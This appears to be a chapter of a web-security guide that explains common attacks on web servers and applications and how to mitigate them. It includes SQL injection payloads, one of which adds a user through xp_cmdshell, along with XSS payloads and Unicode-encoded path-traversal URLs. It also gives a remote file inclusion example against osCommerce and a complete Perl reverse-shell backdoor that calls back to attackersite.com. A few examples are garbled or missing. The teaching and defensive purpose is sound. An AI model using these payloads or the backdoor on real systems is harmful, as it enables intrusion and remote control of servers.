Table of contents
Common Web Security Attacks Explained	1
What's in this chapter	1
Attacks against the Web Server	1
SQL Injection	3
HTML Injection	6
OS Command Injection	9
Code Injection	10
HTML Parameter Manipulation	12
Canonical Attacks	13
Path Traversal	17
Buffer Overflows	17
Authentication And Authorization Attacks	18
Null byte and CRLF attacks	20
Denial of Service attacks	21


Common Web Security Attacks Explained

What's in this chapter
This chapter describes the common attacks launched against web servers and web applications. For each attack we describe the attack technique along with any available tools that are commonly used by attackers. We then discuss mitigation techniques to ensure that your web application is not found to be vulnerable to these attacks. Finally, wherever possible, we provide preliminary detection techniques to determine if an attacker is trying to exploit these vulnerabilities. If an attacker is able to successfully launch these attacks, he may gain various levels of access ranging from discovering the web technologies being used, to execution of malicious SQL queries against the back-end database.

Attacks against the Web Server
The first set of attacks that an attacker will typically launch against a web application will be targeted at the underlying web server. When trying to attack the server externally, an attacker will try to identify the technologies being used by the web application. These include the underlying web server, the operating system, the business logic components, the back-end database, and the programming language for the web application itself. 

Some smart guesses can be made. For instance, if the web application is coded in ASP, there is a very high probability that the web server is IIS, and the operating system is one of the Windows server versions. There is also a good chance that in this case, the back-end database is probably Microsoft's SQL Server. 

Such preliminary guesses can be further narrowed down by using some of the following techniques to enumerate more information:
Banner grabbing: This may reveal the web server software and version. However, it is relatively easy to change the banner of the real web server with that of some other, in order to try and throw the attacker off track. Most port scanners such as nmap1 or Superscan2 have options to enable banner grabbing during the port scan itself.
Web Server Fingerprinting: Similar to the concept of OS fingerprinting, HTTP fingerprinting tries to determine the remote web server based on its responses to HTTP requests. Thus, even if the banner is modified, tools such as httprint3 will attempt to identify the web server as accurately as possible.
Information disclosure: By inducing an error in the web application or the web server, the attacker can obtain information about the underlying technology. For instance, an error induced by supplying unexpected input values to an ASP page might reveal the back-end database to be Oracle or SQL Server. Another vulnerability that leads to code disclosure is if there are scripts on the web server, that it is not configured to preprocess. For instance, in one case where the site was predominantly coded in PHP, there were a few Perl scripts left lying around, probably from legacy code. Accessing one of the Perl scripts revealed its source including the username and password used to connect to the back-end database. This is also true of .inc files, which could contain sensitive information that can be read because these files are not pre-processed by IIS.
Operating System Fingerprinting: The attacker may use nmap to try and fingerprint the operating system based on its specific implementation of the TCP/IP stack
Once the process of technology identification is complete, the attacker will try to launch attacks against the web server, which exploit configuration mistakes, sample scripts, third-party components such as shopping cards, etc.

One of the most popular open-source tools for testing web applications is Nikto4, which contains an extensive database of vulnerabilities against various web servers. The usual suspect in vulnerability assessment exercises, Nessus, also does a pretty good job of determine vulnerabilities in the web server, operating system, and other technologies. In fact, there are now plugins for Nessus that will attempt to detect the vulnerability of the web application to SQL injection and HTML injection attacks.

At the next stage, the attacker will survey the whole web application to try and determine the general design logic being followed. This is typically done by downloading the entire website onto the local hard drive, and then studying the files to figure out the structure of the web site. For instance, does the web site keep the scripts in a central /admin/ or /scripts/ or /cgi-bin/ folder, or are they located in sub-folders containing the web page calls the functions in the scripts.  Commonly used tools for downloading entire websites include HTTrack5, which has a Windows version called as WinHTTrack, as well as the 'wget' which is a command-line tool, etc. Most of these tools have options for filtering the files that get downloaded from the website, and the levels to which hyperlinks within the downloaded pages are followed and downloaded. Of course, these tools will not download the PHP or ASP scripts, but will instead show their processed outputs.

Another file that deserves specific mention is the 'robots.txt' file. This file contains a list of folders within the website that must be ignored by search engine robots. Most search engine robots do not take this file into cognizance. However, most automated attack tools as well as attackers will look around for the presence of this file, as it will indicate potentially sensitive areas, which may contain files with critical information.

Mitigation Techniques:
The first mitigation measure is to secure your web server. Apply all the security patches for your web server and the underlying operating system. Use commonly available patch checking tools to determine missing patches. Follow secure coding guidelines for the specific web server. Some of these would be to run the web server with normal user privileges, remove sample scripts and files, remove any CGI scripts that are absolutely not required (such as formmail.pl, etc.), remove all features/modules that are not necessary for your website to function, etc. 

Additionally, use utilities or configuration changes to ensure that your webserver does not reveal its actual name and version in the banner. You may use URLScan for Microsoft IIS and modify the httpd.conf to prevent Apache from revealing its version number. Also, you should customize the error pages as they immediately indicate the web server being used. 

To prevent important configuration files such as .inc, .cfg, .config, etc. from being downloaded, you could rename them to have .php or .asp extensions, such that the web server will attempt to preprocess them, and the contents will not get revealed to the attacker. A better solution is to put these files outside of the $DocumentRoot, such that they cannot be accessed simply by typing in the path as a URL.


SQL Injection
Well-designed applications insulate the users from business logic. Some applications however do not validate user input and allow malicious users to make direct database calls to the database. This attack, called direct SQL injection, is surprisingly simple. 

Imagine a login screen to a web application. When the user enters his user ID and password in the web form, his browser is creating an HTTP request to the web application and sending the data. This should be done over SSL to protect the data in transit. That typical request actually may look like this (A GET request is used here for demonstration. In practice this should be done using a POST so that the sensitive information is not displayed on a the address bar of the user's browser where a casual passer-by can read it): 
http://www.vulnerablesite.com/login.asp?username=john&password=doe

The application that receives this request takes the two sets of parameters supplied as input: 
Username  = john
Password = doe
The application builds a database query that will check the user ID and password to authenticate the user. That database query may look like this:
select * from user_table where username='john' and password='doe'

All works just fine until the attacker comes along and figures out he can modify the SQL command that actually gets processed and executed. Here he uses a user ID he does not have a password for and is not authorized to access. For instance: 
http://www.vulnerablesite.com/login.asp?username=admin'--&password=whatever

The resulting SQL now appears like this: 
select * from user_table where username='john'--' and password='whatever'

The consequences are devastating. The single-quote (') closes the opening single-quote used by the application to construct the query. The -- comments out the rest of the SQL command causing the retrieval to ignore the rest of the query, including the value in the password field. The attacker has been able to bypass the administrative password and authenticate as the admin user. A badly designed web application means hackers are able to retrieve and place data in authoritative systems of record at will. Direct SQL Injection can be used to: 
alter the maxlength attribute which will limit how much info a user can enter
change SQL values 
concatenate SQL statements 
add function calls and stored-procedures to a statement
typecast and concatenate retrieved data 

Some examples are shown below to demonstrate these techniques.
Changing SQL Values Malicious HTTP request 
Username: test'; insert into user_table values ('admin','admin');--

Concatenating SQL Statements Malicious HTTP request
Username: test' union select username, password from user_table;--

Adding function calls and stored-procedures to a statement Malicious HTTP request 
Username: test'; exec xp_cmdshell 'net user r00t3d r00t3d /add';--

The important point to note here is that the SQL injection attack technique will differ significantly based on the back-end database that is being used. For instance, it is much easier to execute multiple queries on an MS SQL database by separating them with the semi-colon (;). However, the same attack on an Oracle database requires the use of UNION and more complicated syntax. An excellent article discussing SQL injection attacks on Oracle written by Pete Finnigan is available at:
http://online.securityfocus.com/infocus/1644

The most publicized occurrences of this vulnerability were on the e-commerce sites of Guess.com6 and PetCo.com7. A 20-year old programmer in Orange County, California, Jeremiah Jacks discovered that it was possible to ferret out highly sensitive data such as credit card numbers, transaction details, etc. from these and a number of other sites using specially crafted URLs containing SQL meta-characters.

Mitigation Techniques 
If your input validation strategy is to only accept expected input then the problem is significantly reduced. However this approach is unlikely to stop all SQL injection attacks and can be difficult to implement if the input filtering algorithm has to decide whether the data is destined to become part of a query or not, and if it has to know which database such a query might be run against. For example, a user who enters the last name "O'Neil" into a form includes the special meta-character ('). This input must be allowed, since it is a legitimate part of a name, but it may need to be escaped if it becomes part of a database query. Different databases may require that the character be escaped differently, however, so it would also be important to know for which database the data must be sanitized. 

Fortunately, there is usually a very good solution to this problem. The best way to protect a system against SQL injection attacks is to construct all queries with prepared statements and/or parameterized stored procedures. A prepared statement, or parameterized stored procedure, encapsulates variables and should escape special characters within them automatically and in a manner suited to the target database. Common database API's offer developers two different means of writing a SQL query. For example, in JDBC, the standard Java API for relational database queries, one can write a query either using a PreparedStatement or as a simple String. The preferred method from both a performance and a security standpoint should be to use PreparedStatements. With a PreparedStatement, the general query is written using a ? as a placeholder for a parameter value. Parameter values are substituted as a second step. The substitution should be done by the JDBC driver such that the value can only be interpreted as the value for the parameter intended and any special characters within it should be automatically escaped by the driver for the database it targets. Different databases escape characters in different ways, so allowing the JDBC driver to handle this function also makes the system more portable. 

Common database interface layers in other languages offer similar protections. The Perl DBI module, for example, allows for prepared statements to be made in a way very similar to the JDBC PreparedStatement. Another database interface solution is Cayenne8, which provides management of persistent Java objects mapped to relational databases. Developers should test the behavior of prepared statements in their system early in the development cycle. 

Parameterized stored procedures are a related technique that can also mitigate SQL Injection attacks and also have the benefit of executing faster in most cases. Most RDBMS systems offer a means of writing an embedded procedure that will execute a SQL statement using parameters provided during the procedure call. Typically these procedures are written in a proprietary Fourth Generation Language (4GL) such as PL/SQL for Oracle or T-SQL for SQL Server. When stored procedures are used, the application calls the procedure passing parameters, rather than constructing the SQL query itself. Like PreparedStatements in JDBC, the stored procedure does the substitution in a manner that is safe for that database. 

Use of prepared statements or stored procedures is not a panacea. The JDBC specification does NOT require a JDBC driver to properly escape special characters. Many commercial JDBC drivers will do this correctly, but some definitely do not. Developers should test their JDBC drivers with their target database. Fortunately it is often easy to switch from a bad driver to a good one. Writing stored procedures for all database access is often not practical and can greatly reduce application portability across different databases. 

Because of these limitations and the lack of available analogues to these techniques in some application development platforms, proper input data validation is still strongly recommended. This includes proper canonicalization of data since a driver may only recognize the characters to be escaped in one of many encodings. Defense in depth implies that all available techniques should be used if possible. Careful consideration of a data validation technique for prevention of SQL Injection attacks is a critical security issue. Wherever possible use the "only accept known good data" strategy and fall back to sanitizing the data for situations such as "O'Neil". In those cases, the application should filter special characters used in SQL statements. These characters can vary depending on the database used but often include "+", "-", "," "'" (single quote), '"' (double quote), "_", "*", ";", "|", "?", "&" and "=". 

An article on detection SQL injection attacks on an Oracle database, written by Pete Finnigan is available at:
http://online.securityfocus.com/infocus/1714


Further Reading 
Appendix C in this document contains source code samples for SQL Injection Mitigation. 

http://www.nextgenss.com/papers/advanced_sql_injection.pdf 
http://www.sqlsecurity.com/faq-inj.asp  http://www.spidynamics.com/papers/SQLInjectionWhitePaper.pdf 
http://www.nextgenss.com/papers/advanced_sql_injection.pdf 
http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf 


HTML Injection

HTML Injection, better known as Cross-site scripting, has received a great deal of press attention. The name originated from the CERT advisory, CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests [http://www.cert.org/advisories/CA-2000-02.html]. Although these attacks are most commonly known as "Cross-site Scripting" (abbreviated XSS), the name is somewhat misleading. The implication of the name "Cross-site Scripting" is that another site or external source must be involved in the attack. Posting links on an external site that inject malicious HTML tags on another site is one way that an HTML Injection attack can be executed, but is by no means the only way. The confusion caused by the implication that another site must be involved has led some developers to underestimate the vulnerabilities of their systems to the full range of HTML Injection attacks. HTML Injection attacks are exploited on the user's system and not the system where the application resides. Of course if the user is an administrator of the system, that scenario can change. To explain the attack let's follow an example. 

Imagine a system offering message board services where one user can post a message and other users can read it. Posted messages normally contain just text, but an attacker could post a message that contains HTML codes including embedded JavaScript. If the messages are accepted without proper input filtering, then the embedded codes and scripts will be rendered in the browsers of those viewing the messages. What's more, they will execute in the security context of the user viewing the message, not the user posting the message. In the above message-board example, imagine an attacker submits the following message. 
<script>alert(document.cookie)</script>

When this message is rendered in the browser of a user who reads the post, it would display that user's cookie in an alert window. In this case, each user reading the message would see his own cookie, but simple extensions to the above script could deliver the cookies to the attacker. The following example would leave the victim's cookie in the web log of a site owned by the attacker. 

If that cookie reveals an active session id of another user or a system administrator it gives the attacker an easy means of masquerading as that user in the host system. The "cross-site" version of the above attack would be to post a URL on another site that encoded similar malicious scripts. An attacker's website might offer a link that reads, "click here to purchase this book at Megabooks.com". Embedded into the link could be the same malicious codes as in the above example. If Megabooks.com returned the unfiltered payload to the victim's browser, the cookie of a Megabooks.com account member would be sent to the attacker. In the above examples, the payload is a simple JavaScript command. 

Because modern client-side scripting languages now run beyond simple page formatting, a tremendous variety of dangerous payloads can be constructed. In addition many clients are poorly written and rarely patched. These clients may be tricked into executing an even greater number of dangerous functions. There are four basic contexts for input within an HTML document. While the basic technique is the same, all of these contexts require different tests to be conducted to determine whether the application is vulnerable to this form of HTML injection: 
Tags - This is the most common usage of HTML Injection and involves inserting tags such as <SCRIPT>, <A> <IMG> or <IFRAME> into the HTML document. This context is used when the attack data is displayed as text in the HTML document. 
Events - An often-missed context is the use of scripting events, such as "onclick". This context is usually used when the payload is displayed to the user as an input field or as an attribute of another tag. A form element attribute such as "onclick" can encode the same type of malicious JavaScript commands, executed when a user clicks on the form element, for example: '" onclick="javascript:alert(123)' 
Indirect Scripting - Some web applications, such as message boards, allow limited HTML to be injected by the user. This is sometime done using an intermediate tag library, which is translated by the application into HTML before returning the page to the browser. For example, if: "[IMG]a.gif[/IMG]" generates the following HTML: "<img src="a.gif"/>" then the technique could be exploited by an input such as this: '[IMG]nonsense.gif" onerror="alert(1)[/IMG]' 
Direct Scripting - Other web applications will occasionally generate scripting code on the fly and include data that originated from users in the script. 

As the above examples show, there are many ways in which HTML Injection can be used. HTML Injection attacks are some of the easiest for attackers to uncover because of the immediate test-response cycles and because of the limited knowledge of the application structure required. Malicious attacks can come from internal users as well as outside users. Therefore, preventing HTML Injection attacks is absolutely essential, even for applications on an intranet or other secure system. 

Famous examples of cross-site scripting have been found in sites such as Paypal.com, Apple.com, Citibank's online cash-payment site C2IT.com9, and CNN.com. 

Mitigation Techniques 
If the web server does not specify which character encoding is in use, the client cannot tell which characters are special. Web pages with unspecified character-encoding work most of the time because most character sets assign the same characters to byte values below 128. Determining which characters above 128 are considered special is somewhat difficult. Web servers should set the character set, then make sure that the data they insert is free from byte sequences that are special in the specified encoding. 

This can typically be done by settings in the application server or web server. The server should define the character set in each html page as below. The above tells the browser what character set should be used to properly display the page. In addition, most servers must also be configured to tell the browser what character set to use when submitting form data back to the server and what character set the server application should use internally. The configuration of each server for character set control is different, but is very important in understanding the canonicalization of input data. Control over this process also helps markedly with internationalization efforts. Filtering special meta characters is also important. HTML defines certain characters as "special", if they have an effect on page formatting. 

In an HTML body: 
"<" introduces a tag. 
"&" introduces a character entity. 
Note: Some browsers try to correct poorly formatted HTML and treat ">" as if it were "<". 

In attributes: 
double quotes mark the end of the attribute value. 
single quotes mark the end of the attribute value. 
"&" introduces a character entity. 

In URLs: 
Space, tab, and new line denote the end of the URL. 
"&" denotes a character entity or separates query string parameters. 
Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs. 

The "%" must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. Ensuring correct encoding of dynamic output can prevent malicious scripts from being passed to the user. While this is no guarantee of prevention, it can help contain the problem in certain circumstances. The application can make an explicit decision to encode untrusted data and leave trusted data untouched, thus preserving mark-up content. Encoding untrusted data can introduce additional problems however. Encoding a "<" in an untrusted stream means converting it to "<". This conversion makes the string longer, so any length checking of the input should be done only after canonicalization and sanitization of the data. See the section on 'Canonicalization Attacks' below.

Further Reading
Appendix B in this document contains source code samples for Data Validation.
http://www.cert.org/tech_tips/malicious_code_mitigation.html 


OS Command Injection
Description
Nearly every programming language allows the use of so called "system-commands", and many applications make use of this type of functionality. System-interfaces in programming and scripting languages pass input (commands) to the underlying operating system. The operating system executes the given input and returns its output to stdout along with various return-codes to the application such as successful, not successful etc. System commands can be a very convenient feature, which with little effort can be integrated into a web-application. Common usage for these commands in web applications are file handling (remove and copy), sending emails, and calling operating system tools to modify the applications input and output in various ways (filters). 

Depending on the scripting or programming language and the operating-system it is possible to: 
Alter system commands
Alter parameters passed to system commands
Execute additional commands and OS command line tools
Execute additional commands within executed command
Alter system commands
Alter system commands

Some common techniques for calling system commands in various languages that should be carefully checked include:
PHP
require()
include()
eval()
preg_replace() (with /e modifier)
exec()
passthru()
` (backticks)
system()
popen()

Shell Scripts
often problematic and dependent on the shell

Perl
open()
sysopen()
glob()
system()
` (backticks)
eval()

Java(Servlets, JSP's)
System.* (especially System.Runtime)

C & C++ 
system() 
exec**() 
strcpy 
strcat 
sprintf 
vsprintf 
gets 
strlen 
scanf 
fscanf 
sscanf 
vscanf
vsscanf 
vfscanf 
realpath 
getopt 
getpass 
streadd 
strecpy 
strtrns

Mitigation Techniques
There are several techniques that can be used to mitigate the risk of passing malicious information to system commands. The best way is to carefully limit all information passed to system commands to only known values. If the options that can be passed to the system commands can be enumerated, that list can be checked and the system can ensure that no malicious information gets through. When the options cannot be enumerated, the other option is to limit the size to the smallest allowable length and to carefully sanitize the input for characters, which could be used to launch the execution of other commands. Those characters will depend on the language used for the application, the specific technique of function being used, as well as the operating system the application runs on. As always, checks will also have to be made for special formatting issues such as Unicoded characters. The complexity of all of these checks should make it very clear why the "only accept known valid data" is the best and easiest approach to implement. 

Code Injection

In a code injection attack the attacker attempts to inject CGI code into the web application. This is a bit different from the other types of code injection, such as operating system commands or SQL queries. The best way to explain this would be to take a live example of a shopping cart software that had such a vulnerability discovered in it.

The osCommerce shopping cart comes with two files called /catalog/includes/include_once.php
catalog/includes/include_once.php
Both these files reference a variable called as $include_file, which is not initialized within the code. For instance, the contents of $include_once.php are:
 
<? 
  if (!defined($include_file . '__')) { 
    define($include_file . '__', 1); 
 include($include_file); 
  } 
?> 

This code could be exploited by an attacker using a URL such as:
http://website.com/catalog/inludes/include_once.php? 
include_file=ANY_FILE, he would be able to include any code he wants.
 
You could even include a file from a third-party location, such as the attacker's website. For instance, with the following code the attacker could determine the Unix version number:
 
http://website.com/catalog/inludes/include_once.php?include_file=http://attackersite.com/syscmd.php 

Where, the contents of syscmd.php could be:
<? passthru("/bin/uname")?> 

A more malicious attack would involve, the attacker writing a PHP script that took a particular input, and passed it to the 'passthru' call to be executed as a Unix system command. For instance, the contents of syscmd.php could be:
<? passthru("$cmd")?> 

This code could be executed repeatedly by the attacker with a URL such as:

http://website.com/catalog/inludes/include_once.php?include_file=http://attackersite.com/syscmd.php?cmd=wget http://attackersite.com/backdoor.pl

Where the contents of backdoor.pl could be something like:
#!/usr/bin/perl
use Socket;

$execute= 'echo "`uname -a`";echo "`id`";/bin/sh';

$target="attackersite.com";
$port="9988";
$iaddr=inet_aton($target) || die("Error: $!\n");
$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system($execute);
close(STDIN);
close(STDOUT);

Since backdoor.pl would get downloaded below the $DocumentRoot in Apache, it could then be executed by the attacker, simple as http://website.com/backdoor.pl

On execution, the Perl code would pipe a Unix command shell back to the attacker's site, where he could then simple execute commands with the privilege level of the Apache web server. He could of course use local exploits for Linux kernel vulnerabilities and elevate his privileges.

Mitigation Techniques
There are multiple ways in which this problem can be mitigated. Besides input validation, the important measure to be implemented is to protect sensitive files such as include_once.php, so that they cannot be accessed directly by a user. This could be done with the help of .htaccess in Apache. The code could also be modified to make sure that the include_file variable is correctly initialized. Further, the attack also works because the PHP register_globals variable is ON. This lets the attacker initialize the variable include_file. As of PHP 4.2.0 this variable is set by default to OFF, and that's how it should stay.


HTML Parameter Manipulation

HTML parameter manipulation is done via form fields or cookie values. It involves modifying the values of those parameters that the web application assumes as specific values. Typically, these values are stored in cookies on the user's system, or they are hidden HTML form fields. In either case, the web application trusts these values and depends on them for its proper functioning. 

One such attack is the price manipulation attack. This attack utilizes a vulnerability in which the total payable price of the purchased goods is stored in a hidden HTML field of a dynamically generated web page. An attacker can use a web application proxy such as Achilles10 or Paros11 to simply modify the amount that is payable, when this information flows from the user's browser to the web server. Another technique is to save the final payment page on the attacker's system, open it up in an editor, modify the values, and resubmit it. For instance, in a typically vulnerable shopping cart payment system, the submitted HTTP request would appear as:
merchant_code=AA11&orderid=7137107C17C&currency=USD&amount=879.00

The final payable price (currency=USD&amount=879.00) can be manipulated by the attacker to a value of his choice. This information is eventually sent to the payment gateway with whom the online merchant has partnered. If the volume of transactions is very high, the price manipulation may go completely unnoticed, or may be discovered too late. Repeated attacks of this nature could potentially cripple the viability of the online merchant.

A simple variation is manipulation of drop-down box entries, which list say countries or states, and the server-side code expects the user input to be any one of the values present in the drop-down list. However, it is trivial to manipulate this data and carry out any of the attacks listed herein, including SQL injection.

Another parameter manipulation attack is to modify the session ID or order ID or any other parameter that is being used to uniquely identify either the specific user or the user's specific transaction. Ideally, this parameter should be generated using a cryptographically secure randomization algorithm. However, if the web application uses its own proprietary randomization technique, which is not truly random enough, an attacker can manipulate URLs with modified parameter values to access information of other users or other transactions. For instance, in the above URL, if the order ID (orderid=712371007C17C) is not random enough, an attacker can write a custom Perl script to try and access the same URL but with brute-forced values for the orderid parameter, and potentially gain access to other user's transactions. This was illustrated in a paper by David Endler [ref 9], "Brute-Force Exploitation of Web Application Session IDs", where he explains how session IDs of sites like www.123greetings.com, www.register.com, and others could be trivially brute-forced.

Another possible variant is to simple enter alphabets where the application expects numeric values and vice-versa. This can at times yield interesting results. Typically, it will make the application display an error, which could reveal critical information. In one specific case, we were able to extract the database number and version by simply feeding a numeric value into the field of a Java program expecting numeric input: 
http://www.myserver.com/navigate/page_id=AA 

Mitigation Techniques
Do not trust user input and assume it to be in the expected format. Do not trust client-side javascript or VB Script code to clean up user input. Carry out input validation at the server side to ensure that user input is what it should be.

The best method of selecting session IDs is to depend on the application platform. ASP, JSP and PHP have their own session ID generating algorithms, which are better to rely on rather than create your own.


Canonical Attacks
Canonicalization deals with the way in which systems convert data from one form to another. Canonical means the simplest or most standard form of something. Canonicalization is the process of converting something from one representation to  the simplest form. Web applications have to deal with lots of canonicalization issues  from URL encoding to IP address translation. When security decisions are made based on canonical forms of data, it is therefore essential that the application is able  to deal with canonicalization issues accurately.

URL Encoding
The RFC 1738 specification defining Uniform Resource Locators (URLs) and the RFC 2396 specification for Uniform Resource Identifiers (URIs) both restrict the characters allowed in a URL or URI to a subset of the US-ASCII character set. According to the RFC 1738 specification, "only alphanumerics, the special characters "$-_.+!*'(),", and reserved characters used for their reserved purposes may be used unencoded within a URL." The data used by a web application, on the other hand, is not restricted in any way and in fact may be represented by any existing character set or even binary data. Earlier versions of HTML allowed the entire range of the ISO-8859-1 (ISO Latin-1)  character set; the HTML 4.0 specification expanded to permit any character in the Unicode character set. 

URL-encoding a character is done by taking the character's 8-bit hexadecimal code and prefixing it with a percent sign ("%"). For example, the US-ASCII character set represents a space with decimal code 32, or hexadecimal 20. Thus its URL-encoded representation is %20. Even though certain characters do not need to be URL-encoded, any 8-bit code (i.e., decimal 0-255 or hexadecimal 00-FF) may be encoded. ASCII control characters such as the NULL character (decimal code 0) can be URL-encoded, as can all 

HTML entities and any meta characters used by the operating system or database. Because URL-encoding allows virtually any data to be passed to the server, proper precautions must be taken by a web application when accepting data. URL-encoding can be used as a mechanism for disguising many types of malicious code.

Here is a SQL Injection example that shows how this attack can be accomplished.

Original database query in search.asp:
sql = "SELECT lname, fname, phone FROM usertable WHERE lname='"

HTTP request:
http://www.myserver.com/search.asp?lname=smith%27%3bupdate%20usertable%

Executed database query:
SELECT lname, fname, phone FROM usertable WHERE lname='smith'; update usertable

A suitable canonical form should be chosen and all user input canonicalized into that form before any authorization decisions are performed. Security checks should be carried out after decoding is completed. It is usually the web server itself that decodes the URL and hence this problem may only occur on the web server itself. 

Unicode
Unicode Encoding is a method for storing characters with multiple bytes. Wherever input data is allowed, data can be entered using Unicode to disguise malicious code and permit a variety of attacks. RFC 2279 references many ways that text can be encoded.
Unicode was developed to allow a Universal Character Set (UCS) that encompasses most of the world's writing systems. Multi-octet characters, however, are not compatible with many current applications and protocols, and this has led to the development of a few UCS transformation formats (UTF) with varying characteristics. UTF-8 has the characteristic of preserving the full US-ASCII range. It is compatible with file systems, parsers and other software relying on US-ASCII values, but it is transparent to other values.

The importance of UTF-8 representation stems from the fact that web-servers/applications perform several steps on their input of this format. The order of the steps is sometimes critical to the security of the application. Basically, the steps are "URL decoding" potentially followed by "UTF-8 decoding", and intermingled with them are various security checks, which are also processing steps.

If, for example, one of the security checks is searching for "..", and it is carried out before UTF-8 decoding takes place, it is possible to inject ".." in their overlong UTF-8 format. Even if the security checks recognize some of the non-canonical format for dots, it may still be that not all formats are known to it. 

Examples:
Consider the ASCII character "." (dot). Its canonical representation is a dot (ASCII 2E). Yet if we think of it as a character in the second UTF-8 range (2 bytes), we get an overlong representation of it, as C0 AE. Likewise, there are more overlong representations: E0 80 AE, F0 80 80 AE, F8 80 80 80 AE and FC 80 80 80 80 AE.

Table 
UCS-4 Range
UTF-8 encoding
0x00000000-0x0000007F
0xxxxxxx
0x00000080 - 0x000007FF
110xxxxx 10xxxxxx
0x00000800-0x0000FFFF
1110xxxx 10xxxxxx 10xxxxxx
0x00010000-0x001FFFFF
11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
0x00200000-0x03FFFFFF
111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
0x04000000-0x7FFFFFFF
1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx

Consider the representation C0 AE of a ".". Like UTF-8 encoding requires, the second octet has "10" as its two most significant bits. Now, it is possible to define 3 variants for it, by enumerating the rest of the possible 2 bit combinations ("00", "01" and "11"). Some UTF-8 decoders would treat these variants as identical to the original symbol (they simply use the least significant 6 bits, disregarding the most significant 2 bits). Thus, the 3 variants are C0 2E, C0 5E and C0 FE.

It is thus possible to form illegal UTF-8 encodings, in two senses: 
A UTF-8 sequence for a given symbol may be longer than necessary for representing the symbol. 
A UTF-8 sequence may contain octets that are in incorrect format (i.e. do not comply with the above 6 formats).

To further "complicate" things, each representation can be sent over HTTP in several ways:
In the raw. That is, without URL encoding at all. This usually results in sending non-ASCII octets in the path, query or body, which violates the HTTP standards. Nevertheless, most HTTP servers do get along just fine with non-ASCII characters.
Valid URL encoding. Each non-ASCII character (more precisely, all characters that require URL encoding - a superset of non ASCII characters) is URL-encoded. This results in sending, say, %C0%AE.
Invalid URL encoding. This is a variant of valid URL encoding, wherein some hexadecimal digits are replaced with non-hexadecimal digits, yet the result is  still interpreted as identical to the original, under some decoding algorithms. For example, %C0 is interpreted as character number ('C'-'A'+10)*16+('0'-'0') = 192. Applying the same algorithm to %M0 yields ('M'-'A'+10)*16+('0'-'0') = 448, which, when forced into a single byte, yields (8 least significant bits) 192, just like the original. So, if the algorithm is willing to accept non-hexadecimal digits (such as 'M'), then it is possible to have variants for %C0 such as %M0 and %BG.

It should be kept in mind that these techniques are not directly related to Unicode, and they can be used in non-Unicode attacks as well. 

http://host/cgi-bin/bad.cgi?foo=../../bin/ls%20-al

URL Encoding of the example attack:
http://host/cgi-bin/bad.cgi?foo=..%2F../bin/ls%20-al

Unicode encoding of the example attack:
http://host/cgi-bin/bad.cgi?foo=..%c0%af../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%pc../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c0%9v../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c0%qf../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%8s../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%1c../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%c1%af../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%e0%80%af../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%f0%80%80%af../bin/ls%20-al
http://host/cgi-bin/bad.cgi?foo=..%f8%80%80%80%af../bin/ls%20-al

Mitigation techniques
A suitable canonical form should be chosen and all user input canonicalized into that form before any authorization decisions are performed. Security checks should be  carried out after UTF-8 decoding is completed. Moreover, it is recommended to check that the UTF-8 encoding is a valid canonical encoding for the symbol it represents.
http://www.ietf.org/rfc/rfc2279.txt?number=2279


Path Traversal
Description
Many web applications utilize the file system of the web server in a presentation tier to temporarily and/or permanently save information or load template or configuration files. The WWW-ROOT directory is typically the virtual root directory within a web server, which is accessible to a HTTP Client. Web Applications may store data inside and/or outside WWW-ROOT in designated locations. If the application does NOT properly check and handle meta-characters used to describe paths, for example "../", it is possible that the application is vulnerable to a "Path Traversal" attack. The attacker can construct a malicious request to return files such as /etc/passwd. This is often referred to as a "file disclosure" vulnerability. Traversing back to system directories that contain binaries makes it possible to execute system commands OUTSIDE designated paths instead of simply opening, including or evaluating file. 

Mitigation Techniques 
Where possible make use of path normalization functions provided by your development language. Also remove offending path strings such as "../" as well as their Unicode variants from system input. Use of "chrooted" servers can also mitigate this issue. Running a web server or any other server, in a 'chroot' involves configuring the system in a way where the web server believes its installation directory to be the system's root directory. Let say, Apache is installed under /usr/apache/. Creating a chroot jail would require copying those system files and folders from their original locations to corresponding locations under /usr/apache. For instance, if a particular file, say /etc/passwd was being referenced, then it would have to be copied to /usr/apache/etc/passwd. Ideally, an edited version of this file would be copied containing only those entries that are necessary for Apache to run. This would be done for all the other files as well as system libraries used by Apache. Thus you would create a sort of virtual Linux system under your main Linux system, which would have only those files and libraries that are absolutely necessary for the Apache web server. If an attacker did manage to compromise the server, he would simply not have any access to the systems' critical files and folders located outside the 'chroot' root directory.

Above all else by only accepting expected input, the problem is significantly reduced. We cannot stress that this is the correct strategy enough!


Buffer Overflows
Description
Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code - effectively taking over the machine. Buffer overflows are not easy to discover and even when one is discovered, it is generally extremely difficult to exploit. Nevertheless, attackers have managed to identify buffer overflows in a staggering array of products and components. Another very similar class of flaws is known as format string attacks. 

Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks. Literature on the topic of buffer overflows against widely used products is widely available. But, buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. 
